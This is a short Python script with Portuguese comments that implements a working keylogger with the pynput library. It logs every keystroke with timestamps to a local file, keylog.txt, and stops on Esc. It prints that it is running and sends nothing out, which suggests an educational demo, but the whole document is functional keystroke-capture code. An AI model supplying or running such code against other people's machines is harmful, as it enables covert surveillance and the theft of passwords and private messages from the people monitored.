from pynput.keyboard import Key, Listener
import logging

# 1. Configurar onde os dados capturados serão salvos
log_dir = "" # Deixe vazio para salvar na mesma pasta do script

logging.basicConfig(
    filename=(log_dir + "keylog.txt"), 
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

# 2. Definir o que fazer quando uma tecla for pressionada
def on_press(key):
    try:
        # Tenta registrar letras e números
        logging.info(str(key.char))
    except AttributeError:
        # Registra teclas especiais (Espaço, Enter, etc)
        logging.info(str(key))

# 3. Definir o que fazer para parar o keylogger
def on_release(key):
    if key == Key.esc:
        print("\nFinalizando Keylogger...")
        return False

# 4. Iniciar o monitoramento
print("Keylogger iniciado... (Pressione 'Esc' para parar)")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()